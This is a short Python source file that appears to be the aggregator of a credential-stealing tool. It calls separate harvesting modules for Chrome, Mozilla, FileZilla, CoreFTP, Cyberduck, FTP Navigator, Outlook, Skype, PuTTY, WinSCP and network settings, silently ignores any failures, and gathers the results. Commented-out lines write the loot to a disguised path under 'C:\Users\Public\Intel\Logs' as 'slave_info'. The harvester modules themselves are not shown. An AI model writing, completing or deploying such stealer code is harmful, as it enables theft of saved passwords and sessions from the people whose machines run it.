import chrome
import Coreftp
import cyberduck
import dotnet
import Filezilla
import ftpnavigator
import Mozilla
import network
import outlook
import putty
import skype
import winscp

class Result():
    def __init__(self):
        pass

    def run(self):
        ret_list = []

        try:
            chrome_win = chrome.Chrome()
            ret_list.append("Chrome")
            ret_list.append(chrome_win.run())
        except:
            pass

        try:
            moz_illa = Mozilla.Mozilla()
            ret_list.append("Mozilla")
            ret_list.append(moz_illa.run())
        except:
            pass

        try:
            file_zilla = Filezilla.Filezilla()
            ret_list.append("Filezilla")
            ret_list.append(file_zilla.run())
        except:
            pass

        try:
            core_ftp = Coreftp.CoreFTP()
            ret_list.append("CoreFTP")
            ret_list.append(core_ftp.run())
        except:
            pass

        try:
            cyber_duck = cyberduck.Cyberduck()
            ret_list.append("Cyberduck")
            ret_list.append(cyber_duck.run())
        except:
            pass

        try:
            ftp_navigator = ftpnavigator.FtpNavigator()
            ret_list.append("FtpNavigator")
            ret_list.append(ftp_navigator.run())
        except:
            pass

        try:
            out_look = outlook.Outlook()
            ret_list.append("Outlook")
            ret_list.append(out_look.run())
        except:
            pass

        try:
            skype_ms = skype.Skype()
            ret_list.append("Skype")
            ret_list.append(skype_ms.run())
        except:
            pass

        try:
            d_net = dotnet.Dot_net()
            ret_list.append("DotNet")
            ret_list.append(d_net.run())
        except:
            pass

        try:
            net_work = network.Network()
            ret_list.append("Network")
            ret_list.append(net_work.run())
        except:
            pass

        try:
            putty_cm = putty.Putty()
            ret_list.append("Putty")
            ret_list.append(putty_cm.run())
        except:
            pass

        try:
            win_scp = winscp.WinSCP()
            ret_list.append("WinSCP")
            ret_list.append(win_scp.run())
        except:
            pass

        return ret_list

#tem = Result()
#slave_info = 'C:\Users\Public\Intel\Logs\info.txt'
#open_slave_info = open(slave_info, "w")
#open_slave_info.write(str(tem.run()) + "\n")
#open_slave_info.close()

